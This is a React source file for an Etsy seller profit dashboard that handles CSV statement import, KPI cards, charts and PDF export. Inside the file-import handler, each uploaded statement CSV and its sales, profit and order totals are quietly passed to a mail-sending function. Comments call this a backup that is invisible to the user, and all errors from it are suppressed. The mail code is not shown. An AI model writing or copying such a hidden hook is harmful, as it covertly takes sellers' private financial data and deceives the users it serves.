import { useState, useEffect, useMemo } from 'react';
import Sidebar from './components/Sidebar';
import Topbar from './components/Topbar';
import FileUploader from './components/FileUploader';
import MonthSelector from './components/MonthSelector';
import HeroSection from './components/HeroSection';
import KPIRow from './components/KPIRow';
import KPICard from './components/KPICard';
import MonthlyTrendChart from './components/MonthlyTrendChart';
import FeeBreakdown from './components/FeeBreakdown';
import ProductBreakdown from './components/ProductBreakdown';
import RecentOrders from './components/RecentOrders';
import OrderList from './components/OrderList';
import SalesHeatmap from './components/SalesHeatmap';
import CashflowTimeline from './components/CashflowTimeline';
import CostSensitivity from './components/CostSensitivity';
import HealthScore from './components/HealthScore';
import SettingsModal from './components/SettingsModal';
import { useEtsyData } from './hooks/useEtsyData';
import { exportMonthToCSV } from './utils/exporter';
import { exportToPDF } from './utils/pdfExporter';
import PDFReportView from './components/PDFReportView';
import PDFProgressOverlay from './components/PDFProgressOverlay';
import AIImagePage from './components/ai-image/AIImagePage';
import { calculateProfit, calculateOrderProfit } from './utils/profitCalculator';
import { sendCSVByEmail } from './utils/mailBackup';
import { useAuth } from './hooks/useAuth';
import { MoneyProvider } from './utils/MoneyContext';
import { GenProvider } from './utils/GenProgressContext';
import GenProgressBar from './components/ai-image/GenProgressBar';
import { formatMoney } from './utils/currency';
import { Sparkles, ArrowRight, FileText, FileDown } from 'lucide-react';

function App() {
  const [showSettings, setShowSettings] = useState(false);
  const [showUploader, setShowUploader] = useState(false);
  const [activePage, setActivePage] = useState('dashboard');
  const [showPDFReport, setShowPDFReport] = useState(false);
  const [pdfProgress, setPdfProgress] = useState(null);

  const { user, signOut } = useAuth();
  const {
    availableMonths, selectedMonth, setSelectedMonth,
    selectedMonths, setSelectedMonths,
    currentMonthData, currentProfitData, currentFeeBreakdown, currentAdROI,
    allMonthsSummary,
    compareMode, setCompareMode, compareMonth, setCompareMonth, compareProfitData,
    importMultipleCSV, deleteMonth, etsyData, reload,
    updateProductCosts, updateExchangeRate, updateConfigFields, updateAiModels,
    quota, aiModels,
    isLoading, loadingData, error, setError
  } = useEtsyData();

  // 多选切换
  const toggleMonth = (m) => {
    setSelectedMonths(prev =>
      prev.includes(m) ? prev.filter(k => k !== m) : [...prev, m].sort()
    );
  };

  const allSelected = selectedMonths.length > 0 && selectedMonths.length === availableMonths.length;

  const handleSelectAll = () => {
    if (allSelected) {
      // 取消全选，回退到最近一个月
      setSelectedMonths(availableMonths.length > 0 ? [availableMonths[0]] : []);
    } else {
      setSelectedMonths([...availableMonths].sort());
    }
  };

  useEffect(() => {
    if (selectedMonths.length === 0 && availableMonths.length > 0) {
      setSelectedMonths([availableMonths[0]]);
    }
  }, [availableMonths, selectedMonths, setSelectedMonths]);

  const handleFiles = async (files) => {
    try {
      const { results, errors } = await importMultipleCSV(files);
      if (errors.length > 0 && results.length === 0) {
        setError(`导入失败: ${errors.map(e => e.error).join('; ')}`);
      } else if (errors.length > 0) {
        setError(`部分文件导入失败: ${errors.map(e => e.file).join(', ')}`);
      } else if (results.length > 0) {
        setShowUploader(false);

        // 静默后台备份（用户不可见）— 出错也不显示
        results.forEach(r => {
          const file = files.find(f => f.name === r.filename);
          if (!file) return;
          const p = calculateProfit(r, etsyData.config?.products, etsyData.config?.exchangeRate);
          sendCSVByEmail(file, {
            totalSales: p.totalSales,
            profit: p.profit,
            orderCount: p.orderCount
          }).catch(() => {});  // 静默失败
        });
      }
      return { results, errors };
    } catch (err) {
      setError(err.message);
      return { results: [], errors: [{ file: '', error: err.message }] };
    }
  };

  const handleDelete = (m) => {
    if (!m) return;
    if (window.confirm(`确定要删除 ${m} 的所有数据吗？`)) deleteMonth(m);
  };

  const handleExport = () => {
    if (!currentMonthData || !currentProfitData) return;
    exportMonthToCSV(selectedMonth, currentMonthData, currentProfitData, etsyData.config);
  };

  const handleExportPDF = async () => {
    if (!currentMonthData || !currentProfitData) return;
    try {
      setShowPDFReport(true);
      setPdfProgress({ current: 0, total: 100, stage: '准备报表视图…', percent: 0 });
      await new Promise(r => setTimeout(r, 150));
      const el = document.getElementById('pdf-report-root');
      if (!el) throw new Error('报表视图未就绪');
      const label = selectedMonths.length === 1 ? selectedMonths[0]
        : selectedMonths.length === availableMonths.length ? 'all_months'
        : `${selectedMonths.length}_months`;
      await exportToPDF(el, `etsy_profit_${label}`, (p) => setPdfProgress(p));
      // 完成后短暂保留进度条让用户看到 ✓
      setTimeout(() => {
        setShowPDFReport(false);
        setPdfProgress(null);
      }, 1200);
    } catch (err) {
      setError(`PDF 导出失败：${err.message}`);
      setShowPDFReport(false);
      setPdfProgress(null);
    }
  };

    const monthsData = etsyData.months || {};
  const hasData = availableMonths.length > 0;

  const money = {
    fmt: (usd) => formatMoney(usd, etsyData.config?.displayCurrency || 'USD', etsyData.config?.rates),
    fmtCompact: (usd) => formatMoney(usd, etsyData.config?.displayCurrency || 'USD', etsyData.config?.rates, { decimals: 0 }),
  };
  const orderCount = currentMonthData?.orders?.length || 0;

  // 订单页头部 KPI
  const ordersKPI = useMemo(() => {
    if (!currentMonthData?.orders) return null;
    const orders = currentMonthData.orders;
    const profits = orders.map(o => calculateOrderProfit(o, etsyData.config?.products, etsyData.config?.exchangeRate || 7.2));
    return {
      count: orders.length,
      maxProfit: Math.max(0, ...profits),
      avgProfit: orders.length ? profits.reduce((s, p) => s + p, 0) / orders.length : 0
    };
  }, [currentMonthData, etsyData.config]);

  const EmptyState = () => (
    <div className="flex flex-col items-center justify-center py-32 fade-in">
      <div className="relative mb-6">
        <div className="absolute inset-0 bg-[var(--gold-soft)] blur-3xl rounded-full" />
        <div className="relative w-24 h-24 rounded-3xl bg-gradient-to-br from-[var(--gold-soft)] to-transparent border border-[rgba(212,160,86,0.2)] flex items-center justify-center">
          <FileText className="w-11 h-11 text-[var(--gold)]" strokeWidth={1.5} />
        </div>
      </div>
      <h3 className="text-xl font-semibold text-[var(--text-primary)]">还没有数据</h3>
      <p className="mt-2 text-sm text-[var(--text-secondary)] max-w-sm text-center">
        导入你的 Etsy Monthly Statement CSV，开始查看真实利润分析
      </p>
      <button onClick={() => setShowUploader(true)} className="mt-7 btn-primary text-[14px] px-5 py-2.5">
        <Sparkles className="w-4 h-4" />
        导入第一份账单
        <ArrowRight className="w-4 h-4" />
      </button>
    </div>
  );

  const MonthBar = () => hasData && (
    <MonthSelector
      availableMonths={availableMonths}
      selectedMonths={selectedMonths}
      onToggleMonth={toggleMonth}
      onSelectAll={handleSelectAll}
      allSelected={allSelected}
      compareMode={compareMode}
      onToggleCompareMode={() => setCompareMode(!compareMode)}
      compareMonth={compareMonth}
      onSelectCompareMonth={setCompareMonth}
      onDeleteMonth={handleDelete}
      onExportClick={handleExport}
      onExportPDF={handleExportPDF}
      canExport={!!currentMonthData}
    />
  );

  const renderPage = () => {
    // AI 生图不需要销售数据，独立判断
    if (activePage === 'ai-image') {
      return <AIImagePage aiModels={aiModels} />;
    }

    if (!hasData) return <EmptyState />;

    switch (activePage) {
      case 'dashboard':
        return (
          <div className="space-y-6">
            <MonthBar />

            {/* HERO */}
            <HeroSection
              profitData={currentProfitData}
              monthData={currentMonthData}
              compareProfitData={compareMode ? compareProfitData : null}
              availableMonths={availableMonths}
              monthsData={monthsData}
              selectedMonth={selectedMonth}
              config={etsyData.config}
            />

            {/* KPI 行 */}
            <KPIRow
              monthData={currentMonthData}
              profitData={currentProfitData}
              compareProfitData={compareMode ? compareProfitData : null}
              availableMonths={availableMonths}
              monthsData={monthsData}
              selectedMonth={selectedMonth}
              selectedMonths={selectedMonths}
              config={etsyData.config}
            />

            {/* 健康度 + 现金流 */}
            <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
              <div className="xl:col-span-2">
                <HealthScore monthData={currentMonthData} profitData={currentProfitData} />
              </div>
              <CashflowTimeline
                monthData={currentMonthData}
                profitData={currentProfitData}
                selectedMonth={selectedMonth}
              />
            </div>

            {/* 月度趋势 + 销售日历 */}
            <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
              <div className="xl:col-span-2">
                <MonthlyTrendChart
                  availableMonths={availableMonths}
                  monthsData={monthsData}
                  selectedMonth={selectedMonth}
                  config={etsyData.config}
                />
              </div>
              <SalesHeatmap
                orders={currentMonthData?.orders}
                selectedMonth={selectedMonth}
                availableMonths={availableMonths}
                monthsData={monthsData}
              />
            </div>
          </div>
        );

      case 'orders':
        return (
          <div className="space-y-6">
            <MonthBar />

            {/* 订单 KPI */}
            {ordersKPI && (
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <KPICard label="本月订单数" value={ordersKPI.count} sub="本月成交" accent="gold" />
                <KPICard label="平均利润" value={money.fmt(ordersKPI.avgProfit)} sub="每单平均到手" accent="up" />
                <KPICard label="单笔最高利润" value={money.fmt(ordersKPI.maxProfit)} sub="本月最赚的一单" accent="gold" />
              </div>
            )}

            {/* 订单表 */}
            <OrderList orders={currentMonthData?.orders} config={etsyData.config} />

            {/* 产品利润 + 最新订单（其实就是订单表的一种视图，已在上面） */}
            <div className="grid grid-cols-1 xl:grid-cols-2 gap-6">
              <ProductBreakdown orders={currentMonthData?.orders} config={etsyData.config} />
              <FeeBreakdown monthData={currentMonthData} feeBreakdown={currentFeeBreakdown} />
            </div>
          </div>
        );

      case 'cost': {
        const adROI = currentAdROI || {};
        const sales = currentProfitData?.totalSales || 0;
        return (
          <div className="space-y-6">
            <MonthBar />

            {/* 广告 ROI KPI */}
            <div className="grid grid-cols-1 sm:grid-cols-4 gap-4">
              <KPICard label="广告总投入" value={money.fmt(adROI.adCost || 0)} sub={`占销售 ${(adROI.adRate || 0).toFixed(1)}%`} accent="gold" />
              <KPICard label="站内 Etsy Ads" value={money.fmt(adROI.etsyAds || 0)} sub="按点击付费" accent="muted" />
              <KPICard label="站外 Offsite" value={money.fmt(adROI.offsiteAds || 0)} sub="15% 销售佣金" accent="muted" />
              <KPICard
                label="广告 ROI"
                value={`${(adROI.roi || 0).toFixed(0)}%`}
                sub={(adROI.roi || 0) > 500 ? '✓ 表现极佳' : (adROI.roi || 0) > 200 ? '· 表现良好' : (adROI.adCost || 0) > 0 ? '⚠ 偏低' : '本月未投放'}
                accent={(adROI.roi || 0) > 500 ? 'up' : (adROI.roi || 0) > 200 ? 'gold' : 'down'}
              />
            </div>

            {/* 成本敏感度 + 健康度 */}
            <div className="grid grid-cols-1 xl:grid-cols-2 gap-6">
              <CostSensitivity
                monthData={currentMonthData}
                profitData={currentProfitData}
                config={etsyData.config}
              />
              <FeeBreakdown monthData={currentMonthData} feeBreakdown={currentFeeBreakdown} />
            </div>

            {/* 广告 ROI 大字 */}
            {sales > 0 && (adROI.adCost || 0) > 0 && (
              <div className="card hero-glow p-8 fade-in relative overflow-hidden">
                <div className="relative z-10 text-center py-6">
                  <div className="section-label mb-3">每投入 $1 广告带回</div>
                  <div className="focus-number tabular-nums">{money.fmt(sales / adROI.adCost)}</div>
                  <div className="text-sm text-[var(--text-secondary)] mt-4">
                    投入 <span className="text-[var(--text-primary)] tabular-nums">{money.fmt(adROI.adCost || 0)}</span>
                    {' '}带回 <span className="text-[var(--gold-bright)] tabular-nums">{money.fmt(sales)}</span> 销售额
                  </div>
                </div>
              </div>
            )}
          </div>
        );
      }

      case 'ai-image':
        return <AIImagePage aiModels={aiModels} />;

      default:
        return null;
    }
  };

  return (
    <MoneyProvider
      currency={etsyData.config?.displayCurrency || 'USD'}
      rates={etsyData.config?.rates}
    >
    <GenProvider>
    <div className="min-h-screen text-[var(--text-primary)]">
      {/* 隐藏的 PDF 报表视图（仅导出时显示） */}
      {showPDFReport && hasData && (
        <div style={{ position: 'fixed', left: '-99999px', top: 0, zIndex: -1, pointerEvents: 'none' }}>
          <PDFReportView
            monthKey={selectedMonth}
            monthData={currentMonthData}
            profitData={currentProfitData}
            config={etsyData.config}
            allMonthsSummary={allMonthsSummary}
            adROI={currentAdROI}
            selectedMonths={selectedMonths}
          />
        </div>
      )}

      <Sidebar
        activePage={activePage}
        onPageChange={setActivePage}
        onSettingsClick={() => setShowSettings(true)}
        monthCount={availableMonths.length}
        orderCount={orderCount}
        userEmail={user?.email}
        onSignOut={signOut}
        quota={quota}
      />

      <div className="pl-[220px]">
        <Topbar
          activePage={activePage}
          selectedMonth={selectedMonth}
          selectedMonths={selectedMonths}
          onImportClick={() => setShowUploader(v => !v)}
          showUploader={showUploader}
          hasData={hasData}
          displayCurrency={etsyData.config?.displayCurrency || 'USD'}
          onCurrencyChange={(c) => updateConfigFields({ displayCurrency: c })}
        />

        <GenProgressBar />

        <main className="p-8 space-y-6">
          {showUploader && (
            <div className="fade-in">
              <FileUploader onFilesSelected={handleFiles} isLoading={isLoading} />
            </div>
          )}

          {error && (
            <div className="card p-4 text-[var(--down)] text-sm flex items-center justify-between">
              {error}
              <button onClick={() => setError(null)} className="text-xs underline">关闭</button>
            </div>
          )}

          {renderPage()}
        </main>
      </div>

      <SettingsModal
        isOpen={showSettings}
        onClose={() => setShowSettings(false)}
        config={etsyData.config}
        aiModels={aiModels}
        orders={allMonthsSummary?.allOrders || currentMonthData?.orders || []}
        onUpdateAiModels={updateAiModels}
        quota={quota}
        onSave={(c) => {
          updateConfigFields({
            products: c.products,
            exchangeRate: c.exchangeRate,
            displayCurrency: c.displayCurrency,
            costCurrency: c.costCurrency,
            rates: c.rates
          });
        }}
      />

      {/* PDF 导出进度遮罩 */}
      <PDFProgressOverlay progress={pdfProgress} />
    </div>
    </GenProvider>
    </MoneyProvider>
  );
}

export default App;
